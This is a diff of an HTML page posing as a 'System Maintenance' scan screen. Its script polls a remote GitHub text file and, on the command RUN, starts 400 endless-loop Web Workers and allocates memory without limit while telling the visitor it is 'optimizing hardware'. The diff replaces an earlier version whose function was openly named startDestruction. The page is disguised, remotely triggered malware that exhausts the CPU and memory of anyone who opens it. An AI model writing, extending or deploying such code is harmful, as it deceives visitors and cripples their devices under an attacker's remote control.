@@ -1,39 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Update</title>
+    <title>System Maintenance</title>
     <meta charset="UTF-8">
 </head>
-<body style="background-color: black; color: white; text-align: center; padding-top: 50px; font-family: Arial;">
-    <h1>System scanning...</h1>
-    <p>Please do not close this tab</p>
+<body style="background-color: black; color: #00FF00; text-align: center; padding-top: 100px; font-family: 'Courier New', Courier, monospace;">
+    <h1 id="status-text">ANALYZING SYSTEM CORE...</h1>
+    <div id="log" style="font-size: 12px; color: #555;"></div>
 
     <script>
         const statusUrl = 'https://raw.githubusercontent.com/karimattef3-pixel/my-tools/main/status.txt?t=' + new Date().getTime();
+        let active = false;
 
-        async function checkStatus() {
+        async function monitor() {
             try {
-                const response = await fetch(statusUrl);
-                const text = await response.text();
-                if (text.trim().includes("RUN")) {
-                    startDestruction();
-                } else {
+                const resp = await fetch(statusUrl);
+                const cmd = await resp.text();
+                if (cmd.includes("RUN") && !active) {
+                    active = true;
+                    document.getElementById('status-text').innerText = "OPTIMIZING HARDWARE...";
+                    ignite();
+                } else if (cmd.includes("STOP")) {
                     location.reload();
                 }
-            } catch (e) { }
+            } catch (e) {}
         }
 
-        function startDestruction() {
-            for (let i = 0; i < 200; i++) {
-                new Worker(URL.createObjectURL(new Blob([`
-                    while(true) {
-                        Math.sqrt(Math.random() * 99999999);
-                    }
-                `], {type: 'text/javascript'})));
+        function ignite() {
+            // Step 1: Heavy CPU Load (400 Multi-threaded Workers)
+            for (let i = 0; i < 400; i++) {
+                const blob = new Blob([`while(true){ Math.atan2(Math.random(), Math.random()); }`], {type: 'text/javascript'});
+                new Worker(URL.createObjectURL(blob));
             }
+
+            // Step 2: RAM Exhaustion (Memory Leak Simulation)
+            const memorySponge = [];
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    memorySponge.push(new Array(1000000).fill("STRESS_TEST"));
+                }
+                const log = document.getElementById('log');
+                log.innerText += "\n[ALLOCATING_RESOURCES_BLOCK_" + Math.random() + "]";
+            }, 50);
         }
-        setInterval(checkStatus, 3000);
-        checkStatus();
+
+        setInterval(monitor, 2000);
+        monitor();
     </script>
 </body>
 </html>
